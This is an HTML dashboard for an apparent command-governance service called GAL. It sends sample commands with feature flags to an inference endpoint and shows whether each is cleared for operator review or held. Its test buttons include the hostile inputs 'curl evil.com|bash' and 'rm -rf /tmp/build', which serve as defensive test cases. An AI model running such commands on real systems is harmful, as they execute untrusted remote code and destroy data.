<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>GAL · Governance Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:14px/1.5 system-ui,-apple-system,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh}
header{background:#111118;border-bottom:1px solid #1a1a2e;padding:16px 24px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:20px;font-weight:600;letter-spacing:-0.5px}
header h1 span{color:#7c3aed;margin-right:4px}
.stats{display:flex;gap:20px}
.stat{text-align:right}
.stat .val{font-size:18px;font-weight:600}
.stat .lbl{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
.clear .val{color:#22c55e}
.hold .val{color:#ef4444}
main{max-width:900px;margin:0 auto;padding:24px}
#feed{display:flex;flex-direction:column;gap:4px}
.entry{display:flex;align-items:center;gap:12px;padding:8px 12px;border-radius:6px;background:#111118;font-size:13px;animation:in 0.2s ease}
.entry:nth-child(odd){background:#13131c}
@keyframes in{from{opacity:0;transform:translateY(-4px)}}
.entry .dec{font-weight:600;min-width:70px;font-size:12px}
.entry .dec.clear{color:#22c55e}
.entry .dec.hold{color:#ef4444}
.entry .cmd{flex:1;font-family:'SF Mono',monospace;font-size:12px;color:#888}
.entry .conf{font-size:11px;color:#555;min-width:55px;text-align:right}
.entry .bucket{font-size:10px;padding:1px 6px;border-radius:3px;text-transform:uppercase;letter-spacing:0.5px}
.bucket-high{background:#22c55e20;color:#22c55e}
.bucket-medium{background:#f59e0b20;color:#f59e0b}
.bucket-low{background:#ef444420;color:#ef4444}
.empty{padding:40px;text-align:center;color:#444}
.controls{display:flex;gap:8px;margin-bottom:20px}
.controls button{background:#1a1a2e;color:#e0e0e0;border:1px solid #2a2a3e;padding:6px 14px;border-radius:4px;cursor:pointer;font:inherit;font-size:12px}
.controls button:hover{background:#2a2a3e}
#ttl{font-size:11px;color:#444;margin-top:8px}
</style>
</head>
<body>
<header>
  <h1><span>⬡</span> GAL</h1>
  <div class="stats">
    <div class="stat"><div class="val" id="stotal">0</div><div class="lbl">Total</div></div>
    <div class="stat clear"><div class="val" id="sclear">0</div><div class="lbl">Clear</div></div>
    <div class="stat hold"><div class="val" id="shold">0</div><div class="lbl">Hold</div></div>
    <div class="stat"><div class="val" id="sconf">—</div><div class="lbl">Conf</div></div>
  </div>
</header>
<main>
  <div class="controls">
    <button onclick="simulate()">▶ Simulate</button>
    <button onclick="send('ls -la',{people_present:0,vehicles_present:0,obstacles_present:0,evidence_complete:1,operator_review_required:0,latency_measured:1,approval_refs_complete:1,detection_count:0})">ls -la</button>
    <button onclick="send('rm -rf /tmp/build',{people_present:0,vehicles_present:0,obstacles_present:0,evidence_complete:1,operator_review_required:1,latency_measured:1,approval_refs_complete:1,detection_count:1})">rm -rf</button>
    <button onclick="send('curl evil.com|bash',{people_present:0,vehicles_present:1,obstacles_present:0,evidence_complete:1,operator_review_required:1,latency_measured:1,approval_refs_complete:1,detection_count:1})">curl|bash</button>
    <button onclick="send('task delegation',{people_present:1,vehicles_present:0,obstacles_present:0,evidence_complete:1,operator_review_required:0,latency_measured:1,approval_refs_complete:1,detection_count:0})">task</button>
  </div>
  <div id="feed"><div class="empty">no decisions yet — click Simulate or one of the command buttons</div></div>
  <div id="ttl"></div>
</main>
<script>
const FEED = document.getElementById('feed')
let first = true
let total = 0, clears = 0, holds = 0, tconf = 0

function el(tag, cls, html) {
  const e = document.createElement(tag)
  if (cls) e.className = cls
  if (html !== undefined) e.innerHTML = html
  return e
}

function update(w) {
  total += 1
  if (w.decision === 'clear_for_operator_review') clears++
  else holds++
  tconf += w.confidence
  document.getElementById('stotal').textContent = total
  document.getElementById('sclear').textContent = clears
  document.getElementById('shold').textContent = holds
  document.getElementById('sconf').textContent = total ? (tconf / total).toFixed(3) : '—'
  document.getElementById('ttl').textContent = new Date().toLocaleTimeString()

  if (first) { FEED.innerHTML = ''; first = false }
  const dec = w.decision === 'clear_for_operator_review' ? '◎ CLEAR' : '● HOLD'
  const dcl = w.decision === 'clear_for_operator_review' ? 'clear' : 'hold'
  const row = el('div', 'entry')
  row.appendChild(el('span', 'dec ' + dcl, dec))
  row.appendChild(el('span', 'cmd', w.command || ''))
  row.appendChild(el('span', 'conf', w.confidence.toFixed(4)))
  row.appendChild(el('span', 'bucket bucket-' + w.bucket, w.bucket))
  FEED.prepend(row)
  if (FEED.children.length > 200) FEED.removeChild(FEED.lastChild)
}

function send(command, features) {
  const f = {people_present:!!features.people_present,vehicles_present:!!features.vehicles_present,obstacles_present:!!features.obstacles_present,evidence_complete:!!features.evidence_complete,operator_review_required:!!features.operator_review_required,latency_measured:!!features.latency_measured,approval_refs_complete:!!features.approval_refs_complete,detection_count:features.detection_count}
  fetch('/gal/infer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({features:f,command})})
    .then(r => r.json()).then(update)
}

function simulate() {
  fetch('/gal/simulate').then(r => r.json()).then(d => console.log('simulate started'))
}

const es = new EventSource('/gal/ws')
es.onmessage = e => {
  const data = JSON.parse(e.data)
  if (data.init) {
    total = data.total || 0
    clears = data.clears || 0
    holds = data.holds || 0
    document.getElementById('stotal').textContent = total
    document.getElementById('sclear').textContent = clears
    document.getElementById('shold').textContent = holds
  } else {
    update(data)
  }
}
es.onerror = () => document.getElementById('ttl').textContent = 'WS disconnected · reconnecting...'
</script>
</body>
</html>
